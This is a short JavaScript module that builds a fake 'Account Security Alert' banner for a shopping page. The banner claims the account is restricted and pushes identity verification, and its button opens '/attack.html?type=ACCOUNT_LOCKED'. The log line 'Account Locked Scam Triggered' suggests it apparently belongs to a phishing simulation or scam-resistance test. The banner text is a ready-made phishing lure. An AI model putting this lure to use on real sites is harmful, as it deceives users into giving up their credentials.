import { createBanner } from '../banner_base.js';

export function createAccountLockedBanner(options = {}) {
    return createBanner({
        title: '**🔒 Account Security Alert**',
        message: '*Important:* Your account has been **temporarily restricted**.\n\n' +
                'We\'ve detected **unusual activity** on your account that requires immediate attention.\n' +
                '*To restore full access and continue shopping, please verify your identity.*',
        ctaText: '**Restore Account Access**',
        theme: 'red',  // Preset theme
        onCTA: () => {
            console.log('Account Locked Scam Triggered');
            window.open('/attack.html?type=ACCOUNT_LOCKED&source=MAIN', '_blank');
        }
    });
}